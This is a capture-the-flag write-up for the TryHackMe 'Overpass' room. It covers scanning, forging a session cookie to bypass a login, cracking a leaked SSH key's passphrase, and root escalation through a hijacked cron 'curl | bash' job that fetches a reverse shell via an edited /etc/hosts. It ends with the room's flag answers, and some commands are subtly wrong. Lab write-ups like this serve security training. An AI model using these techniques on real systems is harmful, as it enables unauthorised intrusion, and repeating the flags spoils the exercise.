# TryHackMe Room: Overpass

##### Link: [TryHackMe:Overpass](https://tryhackme.com/room/overpass)

## WriteUp

### Scanning

**Tool: namp**

Command:

```````````````````````````````````````````````````````````````````````
$ sudo nmap -sC -sV -A -oN nmap/initial <IP Address Here>

```````````````````````````````````````````````````````````````````````

1. -sC   ***Scan with common scripts***
2. -sV  ***Scan with Service Version detection***
3. -A   ***Scan in Aggressive Mode(Traceroout,OS detection,)***
4. -oN   ***Save Output in *Normal* Format***


Scan Results/Report

```````````````````````````````````````````````````````````````````````
Nmap scan report for 10.10.13.108
Host is up (0.17s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp   open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass

No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=7/12%OT=22%CT=1%CU=33529%PV=Y%DS=2%DC=T%G=Y%TM=60EC64B
OS:D%P=i686-pc-windows-windows)SEQ(SP=104%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A
OS:)SEQ(CI=Z%II=I)OPS(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508
OS:ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W
OS:5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y
OS:%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%
OS:T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD
OS:=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE
OS:(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 199/tcp)
HOP RTT       ADDRESS
1   176.00 ms 10.8.0.1
2   176.00 ms 10.10.13.108

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.11 seconds

```````````````````````````````````````````````````````````````````````

As we can see from nmap scan report there are 2 open ports
1. Port 22 *for ssh*
2. Port 80 *for http*

### Assumption

As there are two open ports so and now we know our attacking area. SSH required Username and Password or Username and Key to get the system access but that take time and the success rate is low so we ingnore it right now and move into the HTTP. Target have webserver/webapplication running on port 80 and that have a good area for attack so we enumerate this and find the way to exploit the system

### Enumeration

#### Web Directories Scanning

**Tool: ffuf**

Command:

```````````````````````````````````````````````````````````````````````
$ ffuf -w wordlist.txt:FUZZ -u http://IP:PORT/FUZZ -ic 

```````````````````````````````````````````````````````````````````````

1. -w  ***For Directory Scanning Wordlist i.e directory-list-2.3-small.txt from Seclist***
2. :FUZZ  ***This is a keyword that pass to the ffuf that tell's ffuf where they have to start Fuzzing***
3. -u  ***For give him a URL of the Target***
4. -ic  ***ingnore wordlist comments***

OR you can use ***gobustor*** for this also 

Command:

```````````````````````````````````````````````````````````````````````
gobustor dir -w wordlist.txt -u http://IP:PORT 

```````````````````````````````````````````````````````````````````````

1. dir  ***Tell  gobusror that we scan for Directories***
2. -w  ***For Directory Scanning Wordlist i.e directory-list-2.3-small.txt from Seclist***
3. -u  ***For give him a URL of the Target***

Results:

```````````````````````````````````````````````````````````````````````
img                     [Status: 301, Size: 0, Words: 1, Lines: 1]
downloads               [Status: 301, Size: 0, Words: 1, Lines: 1]
aboutus                 [Status: 301, Size: 0, Words: 1, Lines: 1]
admin                   [Status: 301, Size: 42, Words: 3, Lines: 3]
css                     [Status: 301, Size: 0, Words: 1, Lines: 1]

```````````````````````````````````````````````````````````````````````

Findings:

As we can see from the result that there are a hidden directory /admin that have a login panel that required username and password for login and i try some common password like admin:admin and they are incorrect so we bruteforce it for login credential but in THM hint say "OWASP Top 10 Vuln! Do NOT bruteforce." so we don't have to bruteforce this we have to find vulnerbility from it source code press CTRL + U for get the source code and we can see there are three js file on the source
1. [[main.js]]
2. [[login.js]]
3. [[cookie.js]]

The login function is work with the javascript name called login.js as we can see so we can read it to know how login work. As in the login.js file when we see the following function 

```````````````````````````````````````````````````````````````````````
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"

```````````````````````````````````````````````````````````````````````

They are just use if else for login check. when we enter some credential they call **/api/login** to check credentials from **creds** if the credentials don't match they send a response "Incorrect credentials" . Else the set a cookie with a java script function **cookie.set** with the SessionToken with the value **statusorcookie** variable respone now furture check for session token so we can use it with our own made session token with the value of something we want with following js function

```````````````````````````````````````````````````````````````````````
cookies.set("SessionToken","admin")

```````````````````````````````````````````````````````````````````````

Use this function of your browser js console in **inspector mode/Develpor Mode** use CTRL + SHIFT + I  in chrome to go to inspector mode when you use this function on you js console on your browser they set a cookie with the ***sessiontoken*** with the value  ***admin*** so just reload the page and you got login to Administrator area 

There you can see some message to the person name james and that says

```````````````````````````````````````````````````````````````````````
Since you keep forgetting your password, James, I've set up SSH keys for you.

If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.  
Also, we really need to talk about this "Military Grade" encryption. - Paradox

```````````````````````````````````````````````````````````````````````

```````````````````````````````````````````````````````````````````````
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----

```````````````````````````````````````````````````````````````````````

This message have a SSH private key for user james but this private key have a password on it but we can crack it 

### Exploitation

So we have a SSH private key for user james but this key have a password set on the key so we have to crack that ssh key password first to login to the system first so to do that we have to copy the private key to a file for now i name it **id.rsa**  

**Tool: ssh2john**

Command:

```````````````````````````````````````````````````````````````````````
$ ssh2john id.rsa --wordlist=rockyou.txt > id.hash

```````````````````````````````````````````````````````````````````````

1. ssh2john  ***script name***
2. id.rsa    ***Private key file that we want to crack***
3. --wordlist ***For wordlist that they use to crack password i.e rockyou.txt***
4.  id.hash  ***This will create a file name id.hash and write/redirect all the output of the ssh2john file and save it into your directory***


Result:

````
id.rsa:$sshng$1$16$9F85D92F34F42626F13A7493AB48F337$1200$2cdbb9c10041cfba4a67771ce135a5c4852e0ffa29262d435693dad3aa708871e17bc663c37feffb19e6b52dcefaa88d2479cb4bca14551e929a8b30e29a8b19c3f70302afaf30d6b70db270eee635d36ccf02e9deeb68ec435d4c86f3bc96a5ef7fde50df64605d2e6bdad90ba9b0a08da21bab1d94d2f866ab1863baebbc3c5e099264833406ce407dc0a830d658d3583cb2f2a9dc963ba03887fc42b1e8a37d06bfe74031f8a94d2478dc518167f1e16b88c3ca45173f43efb85c936d576f04c5e6af7c6e2a407a23a93f8cb8ea59c2eb84f592d2a449ef5f06feef1ca985f7a0998cd0ea378e0a17617c5ec0649900be5b2d0161649346a19f8de671ce965d4e065d6d9ac50847060aef04fff64bd488bdeb8640544615486e3daa887c51dcac264b80e6e003ada0f4c802657268a9825a8a5fea57b5fb0cd9fd4a6b3420207864e564a5ff8e8aee5bb649b8051f0016d12cbc0554f3206a1ac1a7abd17cd1024b1ced6c59973e8570bd6450f7c67ea7c3223a845e6fb25fbaccba1af66455f5b68299a402bf320d0ca752e92859ec4f7831d6892960d644492ab40fec60aea6f5bfaff61cd5198d4dfcd3e5e7913a450e4ccaa67772e3d3bc842f26af9411ebcf9149bf33ccdeb8a647012c97c187d75d43e0be6b00a55cbac745720f0ff4142e9166f35591db690b401951b2d05289bf55a103ea634cbab053e735e5617b10d6f70e6e6a754a124a53f3463cde79a3c6e4ee14f45ab465a60f90c972242cd1569e370dee0a2a4c8ee4543ec52c5c7b7156d1beb7fbc4448188ab386719e13040a58faecf7e095def2312586b295f71c3fef31b62e890a3279631b6605200a6bf7d9d915566cd5738508291c33c18585ea13e32170ad7854d5f8d08d6fdc47491b84ebfb45f579c7b2f7eb1dd9b827c17655a4b7f8763399e8c2371b6277b1c4eb8e76a75acd38eb5cec913723ad605f563cb84b4476a9040917cef352384441dd325c6bcc9d6cab326ac7421b20083d7e766e2a01943860f0398f0294750b5cd16304f52c414ab7b28a01aa206f0dc6e6b692cc1e78310a57e962fec24ea9effc0e5fa58ca35325905f793370bb7713c512ca4b1dfa41c5fdaacacf4ca81b1dd2b2e45e8611ea0a5b19b016e7c74f9b9d4c7a41c3f9678ff284d8188e0f5424bf585f94f741adcb452683223da9fc4c548bb505c98987387c81db53d229f42f3e69298fab2f175468003d295c05b1d8979d78c7104d54c270eaaabbe006ebd7e8dbb1fa17e05e2f41b32ebca93f0789429312cba472ffc86072b5b3e530fc7e405ad26c166590b376f0f98e22c3e60b66899703813bcb13d7c9f5a6e0ae05320de78347b8ffb1d160949a5cb40e29e37071ffcb5b9762a4eec39818d52ec0bc7b227cba37aeb4ffc6700e65eb3ca5aa294e823e3eca24bcd7790d4e30893b0291b178368ca6e745af1bedd491cfb6836552e9267132f5b867e9aed6b52e3d4f14e88b9dd9075e3ea2e8242f8b2f272618211b908eb52689ead701d99b605f708a68662df7a5acc7287ce1d15b6fa12f5907953b49654f198f663663785deb244d25c220083ae62db9fd0b933477b83487606515a24864e6034ba27a624d9c5a4fcc967efe3a1000a40bc304a54ceff2c647dfec54f71e128b3a1d37c15db9ac895f9ea05cd4b6e8edca6bfc53b

````

This command first change ssh private key format into a hash format that **JohnTheRipper** tool will understand and save it into your system directory with the name id.hash. Now we can crack that hash with **john/JohnTheRipper**

***Tool: john***

Command:

```````````````````````````````````````````````````````````````````````
$ john id.hash --wordlist= rockyou.txt

```````````````````````````````````````````````````````````````````````

1. john  **This is a tool use to crack password hashes**
2. id.hash  **This is the hash file that create by the ssh2john in the above task**
3. --wordlist=  **This is use to specify password wordlist i.e rockyou.txt**

Result:

```````````````````````````````````````````````````````````````````````
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
james13          (id.rsa)
1g 0:00:00:10 DONE (2021-07-13 13:34) 0.09699g/s 1391Kp/s 1391Kc/s 1391KC/sa6_123..*7¡Vamos!
Session completed

```````````````````````````````````````````````````````````````````````

This command give us the password of the private key so now we can login to the james user using ssh 

### Login into The System

So we have the Private key,Username and Private Key password so now we are fully capable to login into the system but first we have to change the private key permission as only we can read and write it no one else 

Command:

```````````````````````````````````````````````````````````````````````
$ chmod 600 id.rsa

```````````````````````````````````````````````````````````````````````

* This command change the permission of the private key so only we can read it 

Now time to login using ssh

```````````````````````````````````````````````````````````````````````
$ ssh -i id.rsa james@IP_Address_here

```````````````````````````````````````````````````````````````````````

Result:

```````````````````````````````````````````````````````````````````````
└─$ ssh -i id.rsa james@10.10.179.213
The authenticity of host '10.10.179.213 (10.10.179.213)' can't be established.
ECDSA key fingerprint is SHA256:4P0PNh/u8bKjshfc6DBYwWnjk1Txh5laY/WbVPrCUdY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.179.213' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id.rsa':
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Jul 13 08:52:08 UTC 2021

  System load:  0.08               Processes:           88
  Usage of /:   22.3% of 18.57GB   Users logged in:     0
  Memory usage: 14%                IP address for eth0: 10.10.179.213
  Swap usage:   0%


47 packages can be updated.
0 updates are security updates.


Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
james@overpass-prod:~$

```````````````````````````````````````````````````````````````````````

So we have now access to the james user. use ***ls** command to see the files

```````````````````````````````````````````````````````````````````````
james@overpass-prod:~$ ls
todo.txt  user.txt

```````````````````````````````````````````````````````````````````````

*Cat* **user.txt** file to see the flag.

### Priv-Esclation

There is also a file name todo.txt as you can see above and this have the following thing and this show on last line they update the overpass build on website from some where on the system using some unknown method for us

```````````````````````````````````````````````````````````````````````
$ cat todo.txt
 
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website

```````````````````````````````````````````````````````````````````````

So lets start exploring some priv-esclation vectors 

1. First searching some SUID binaries using find command like following 

Result:

```````````````````````````````````````````````````````````````````````
$ find / -perm /4000 2>/dev/null

/bin/fusermount
/bin/umount
/bin/su
/bin/mount
/bin/ping
/usr/bin/chfn
/usr/bin/at
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign

```````````````````````````````````````````````````````````````````````

So we could not find some thing interesting in SUID bit binaries so we have to dig more 

2. Search for common files like
  * /etc/shadow
  * /etc/passwd
  * /etc/crontab
  * /etc/hosts

```````````````````````````````````````````````````````````````````````
$ ls -al /etc/crontab /etc/shadow /etc/passwd /etc/hosts

-rw-r--r-- 1 root root    822 Jun 27  2020 /etc/crontab
-rw-rw-rw- 1 root root    250 Jun 27  2020 /etc/hosts
-rw-r--r-- 1 root root   1614 Jun 27  2020 /etc/passwd
-rw-r----- 1 root shadow 1064 Jun 27  2020 /etc/shadow

```````````````````````````````````````````````````````````````````````

As we can see from above the ***crontab** file is readable so we can check it 

```````````````````````````````````````````````````````````````````````
 cat /etc/crontab
 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash

```````````````````````````````````````````````````````````````````````

So the crontab file show us the method they use to update there overpass build with latest code. They use curl to overpass.thm/downloads/src/buildscript.sh  and pipe this into bash and they are run as a root so this will be our priv-esclation vector if we can abuse this.We know from the Above that /etc/hosts file is read and writeable so we can use this to change its local dns file and leverage it into run our own script that give us root shell by using the following commands

```````````````````````````````````````````````````````````````````````
$ nano /etc/hosts

```````````````````````````````````````````````````````````````````````

```````````````````````````````````````````````````````````````````````

127.0.0.1 localhost
127.0.1.1 overpass-prod
10.8.186.33 overpass.thm # This is my THM IP Change this IP with your IP Address
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

```````````````````````````````````````````````````````````````````````

This is the content of the /etc/hosts file and i change the 127.0.0.1 IP of 3rd line with my machine IP  Address.Now go to your machine and make a directories name **downloads/src/** like the following

```````````````````````````````````````````````````````````````````````
$ mkdir -p downloads/src/

```````````````````````````````````````````````````````````````````````

This will create a downloads directory and inside it they also create src directory 

Now go src directory using the following command

```````````````````````````````````````````````````````````````````````
$ cd downloads/src

```````````````````````````````````````````````````````````````````````

Now make a file with the name buildscript.sh 

```````````````````````````````````````````````````````````````````````
$ touch buildscript.sh

```````````````````````````````````````````````````````````````````````

Now write the file with the following revershell in the file 

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

## Note: change the IP Address with your machine IP and PORT with 8080

Now open python server Using the following command

``````````````````````````````````````````````````````````````````````````````````
$ sudo python -m http.server 80 

``````````````````````````````````````````````````````````````````````````````````

## Note: Start the server on the same directory where you create downloads directory not in the src directory 

Now open a lisener on the system using the following command

``````````````````````````````````````````````````````````````````````````````````
$ nc -lnvp 8080

``````````````````````````````````````````````````````````````````````````````````

Now wait for the script to execute on the system.When the script execute on the system you got the connection from your nc lisener and your got root access to the system

Now cat the root.txt and submit it to [Tryhackme](https://tryhackme/room/overpass)




# THM Overpass Answers

Q1: Hack the machine and get the flag in user.txt
A: thm{65c1aaf000506e56996822c6281e6bf7}
Hint: OWASP Top 10 Vuln! Do NOT bruteforce.

Q2: Escalate your privileges and get the flag in root.txt
A: thm{7f336f8c359dbac18d54fdd64ea753bb}

